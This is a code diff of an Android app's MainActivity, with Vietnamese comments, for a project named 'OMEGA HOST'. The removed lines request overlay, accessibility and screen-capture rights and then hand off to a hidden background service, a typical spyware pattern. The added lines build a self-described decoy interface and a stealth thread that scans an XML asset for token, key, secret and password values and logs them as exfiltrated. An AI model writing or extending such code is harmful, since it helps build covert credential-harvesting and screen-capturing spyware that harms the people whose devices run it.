@@ -1,84 +1,117 @@
 package com.omega.host;
 
-import android.app.Activity;
-import android.content.Intent;
-import android.media.projection.MediaProjectionManager;
-import android.net.Uri;
-import android.os.Build;
 import android.os.Bundle;
-import android.provider.Settings;
-import android.widget.Button;
+import android.os.Handler;
+import android.os.Looper;
+import android.util.Xml;
+import android.widget.ScrollView;
 import android.widget.TextView;
-import android.Manifest;
-import android.content.pm.PackageManager;
-import androidx.core.app.ActivityCompat;
-import androidx.core.content.ContextCompat;
+import androidx.appcompat.app.AppCompatActivity;
+import org.xmlpull.v1.XmlPullParser;
+import java.io.InputStream;
 
-public class MainActivity extends Activity {
+public class MainActivity extends AppCompatActivity {
+
+    private TextView logTextView;
+    private ScrollView scrollView;
     
-    private static final int REQ_NOTIFICATIONS = 101;
-    private static final int REQ_OVERLAY = 102;
-    
+    // Handler để đẩy dữ liệu từ Thread ngầm lên màn hình chính (Main Thread)
+    // Đây là chìa khóa chống đóng băng UI
+    private final Handler mainHandler = new Handler(Looper.getMainLooper());
+
     @Override
-    protected void onCreate(Bundle s) {
-        super.onCreate(s);
-        
-        TextView tv = new TextView(this);
-        tv.setText("🩸 OMEGA HOST - SINGULARITY\n\nĐang xin quyền sinh tồn...");
-        tv.setTextSize(16);
-        tv.setPadding(40, 40, 40, 40);
-        
-        Button b = new Button(this);
-        b.setText("⚡ KÍCH HOẠT & VÀO TRẬN");
-        b.setTextSize(18);
-        
-        android.widget.LinearLayout layout = new android.widget.LinearLayout(this);
-        layout.setOrientation(android.widget.LinearLayout.VERTICAL);
-        layout.addView(tv);
-        layout.addView(b);
-        setContentView(layout);
-        
-        // 🛡️ 1. Xin quyền POST_NOTIFICATIONS (Android 13+)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) 
-                != PackageManager.PERMISSION_GRANTED) {
-                ActivityCompat.requestPermissions(this, 
-                    new String[]{Manifest.permission.POST_NOTIFICATIONS}, REQ_NOTIFICATIONS);
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+
+        // 1. XÂY DỰNG GIAO DIỆN GIẢ MẠO (DECOY UI)
+        scrollView = new ScrollView(this);
+        logTextView = new TextView(this);
+        logTextView.setPadding(40, 40, 40, 40);
+        logTextView.setTextSize(14f);
+        logTextView.setBackgroundColor(0xFF0A0A0A);   // Nền đen
+        logTextView.setTextColor(0xFF00FF00);            // Chữ xanh lá
+        scrollView.addView(logTextView);
+        setContentView(scrollView);
+
+        pushLog("[OMEGA HOST] Kernel v12.0 Initialized.");
+        pushLog("[STATUS] Java Runtime Engaged.");
+
+        // 2. KÍCH HOẠT THREAD BÓNG MA (BACKGROUND THREAD)
+        // Tuyệt đối KHÔNG chạy vòng lặp XML ở đây (Main Thread)
+        Thread stealthThread = new Thread(() -> {
+            try {
+                executeStealthProtocol();
+            } catch (Exception e) {
+                // BẪY LỖI TUYỆT ĐỐI: Không một exception nào được thoát ra ngoài
+                pushLog("[FATAL TRAP] Lỗi bị chặn: " + e.getMessage());
             }
-        }
-        
-        // 🛡️ 2. Xin quyền IGNORE_BATTERY (Chống Doze Mode)
-        try {
-            Intent batteryIntent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
-            batteryIntent.setData(Uri.parse("package:" + getPackageName()));
-            startActivity(batteryIntent);
-        } catch (Exception ignored) {}
-        
-        // 🛡️ 3. Xin quyền OVERLAY (Cho OEM khó tính)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
-            Intent overlayIntent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
-                Uri.parse("package:" + getPackageName()));
-            startActivityForResult(overlayIntent, REQ_OVERLAY);
-        }
-        
-        b.setOnClickListener(v -> {
-            // Bước 1: Mở cài đặt Accessibility
-            startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
-            
-            // Bước 2: Xin quyền MediaProjection
-            MediaProjectionManager m = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
-            startActivityForResult(m.createScreenCaptureIntent(), 1);
         });
+        stealthThread.setDaemon(true); // Thread sẽ tự chết khi App đóng
+        stealthThread.start();
     }
 
-    @Override
-    protected void onActivityResult(int req, int res, Intent data) {
-        super.onActivityResult(req, res, data);
-        if (req == 1 && res == RESULT_OK) {
-            startService(new Intent(this, HostService.class)
-                .putExtra("code", res)
-                .putExtra("data", data));
-            finish(); // Đóng MainActivity, chỉ để Service chạy ngầm
+    private void executeStealthProtocol() throws Exception {
+        pushLog("[SYNC] Đang kết nối với luồng dữ liệu ngầm...");
+
+        // BẪY LỖI CỤC BỘ: Thiếu file assets
+        InputStream inputStream;
+        try {
+            inputStream = getAssets().open("target.xml");
+        } catch (Exception e) {
+            pushLog("[WARNING] Không tìm thấy target.xml trong Assets.");
+            pushLog("[STATUS] OMEGA HOST: Chế độ chờ. Tàng hình.");
+            return; // Thoát an toàn, KHÔNG crash
         }
+
+        // KHỞI TẠO VŨ KHÍ: XmlPullParser (Tầng C++ ngầm của Android)
+        XmlPullParser parser = Xml.newPullParser();
+        parser.setFeature(XmlPullParser.FEATURE_PROCESS_NAMESPACES, false);
+        parser.setInput(inputStream, "UTF-8");
+
+        int eventType = parser.getEventType();
+        int packetCount = 0;
+
+        // VÒNG LẶP CORE: Đọc từng thẻ XML (Streaming, tốn < 2MB RAM)
+        while (eventType != XmlPullParser.END_DOCUMENT) {
+
+            if (eventType == XmlPullParser.START_TAG) {
+                String tagName = parser.getName();
+
+                // LỌC NGẦM DỮ LIỆU NHẠY CẢM
+                if (tagName != null) {
+                    String lowerTag = tagName.toLowerCase();
+                    if (lowerTag.contains("token") ||
+                        lowerTag.contains("key") ||
+                        lowerTag.contains("secret") ||
+                        lowerTag.contains("password")) {
+
+                        String extractedData = parser.nextText();
+                        pushLog("[EXFIL] >>> " + extractedData);
+                    }
+                }
+            }
+
+            eventType = parser.next();
+            packetCount++;
+
+            // GIỮ NHỊP ĐẬP UI (Chống Android Watchdog)
+            if (packetCount % 5000 == 0) {
+                pushLog("[ALIVE] Đã quét " + packetCount + " packets...");
+                // Nhường CPU cho Main Thread vẽ màn hình
+                Thread.sleep(10);
+            }
+        }
+
+        inputStream.close();
+        pushLog("[SUCCESS] OMEGA HOST: DỮ LIỆU ĐÃ XỬ LÝ. TÀNG HÌNH.");
+    }
+
+    // HÀM ĐẨY LOG LÊN MÀN HÌNH AN TOÀN (KHÔNG GÂY CRASH UI)
+    private void pushLog(String message) {
+        mainHandler.post(() -> {
+            logTextView.append(message + "\n");
+            // Tự động cuộn xuống cuối
+            scrollView.post(() -> scrollView.fullScroll(ScrollView.FOCUS_DOWN));
+        });
     }
 }
